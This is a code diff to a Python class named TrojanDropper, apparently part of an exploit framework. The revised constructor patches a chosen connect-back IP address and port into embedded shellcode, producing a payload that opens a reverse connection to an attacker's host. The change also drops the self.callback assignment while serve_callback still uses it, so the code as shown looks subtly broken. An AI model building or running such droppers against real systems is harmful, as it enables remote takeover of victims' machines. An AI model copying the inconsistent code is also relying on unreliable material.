@@ -72,19 +72,16 @@ class TrojanDropper:
         "\x0c\x01\x01\x01"  # syscall	0x40404
 ],'')
 
-    def __init__(self,exploit_callback):
-        callback_ip=exploit_callback.callback_ip
-        callback_port=int(callback_server.port)
-
+    def __init__(self,connectback_ip,port=8080):
+        port=int(port)
         shellcode=self.__class__.shellcode
         i = 0
-        for c in socket.inet_aton(callback_ip):
+        for c in socket.inet_aton(connectback_ip):
             shellcode = shellcode.replace("IP%d" % i, c)
             i+=1
-        shellcode=shellcode.replace("PORT1",chr(callback_port >> 8))
-        shellcode=shellcode.replace("PORT2",chr(callback_port & 0xFF))
+        shellcode=shellcode.replace("PORT1",chr(port >> 8))
+        shellcode=shellcode.replace("PORT2",chr(port & 0xFF))
         self.shellcode=shellcode
-        self.callback=exploit_callback
 
     def serve_callback(self):
         self.callback_pid=self.callback.serve_callback()
